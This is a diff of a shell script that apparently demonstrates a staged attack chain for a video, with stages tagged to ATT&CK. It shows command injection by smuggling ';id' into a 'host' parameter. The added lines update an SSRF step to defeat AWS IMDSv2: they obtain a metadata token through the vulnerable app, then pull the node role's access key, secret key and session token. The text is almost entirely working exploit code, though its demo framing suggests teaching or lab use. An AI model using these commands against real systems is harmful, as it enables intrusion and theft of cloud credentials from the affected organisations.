@@ -33,11 +33,18 @@ echo "proving code execution (id):"
 curl -fsS "$APP_URL/tools/diagnose?host=127.0.0.1%3Bid" | jq -r '.stdout'
 
 line "STAGE 2  SSRF to IMDS, steal node credentials  (video: Burp intercept/modify | ATT&CK T1552.005)"
+# IMDSv2 is required, so first get a token (PUT), then use it (GET). The SSRF
+# proxies the method and headers, so both calls go through the vulnerable app.
+# This only works because the node metadata hop limit is 2; at hop limit 1 the
+# pod is one hop too far and every call below times out.
+TOKEN=$(curl -fsS "$APP_URL/summarize" -H 'content-type: application/json' \
+  -d "{\"url\":\"http://169.254.169.254/latest/api/token\",\"method\":\"PUT\",\"headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"60\"}}" \
+  | jq -r '.body')
 ROLE=$(curl -fsS "$APP_URL/summarize" -H 'content-type: application/json' \
-  -d "{\"url\":\"$IMDS/\"}" | jq -r '.body' | head -1)
+  -d "{\"url\":\"$IMDS/\",\"headers\":{\"X-aws-ec2-metadata-token\":\"$TOKEN\"}}" | jq -r '.body' | head -1)
 echo "node instance-profile role: $ROLE"
 CREDS=$(curl -fsS "$APP_URL/summarize" -H 'content-type: application/json' \
-  -d "{\"url\":\"$IMDS/$ROLE\"}" | jq -r '.body')
+  -d "{\"url\":\"$IMDS/$ROLE\",\"headers\":{\"X-aws-ec2-metadata-token\":\"$TOKEN\"}}" | jq -r '.body')
 AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
 AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
 AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
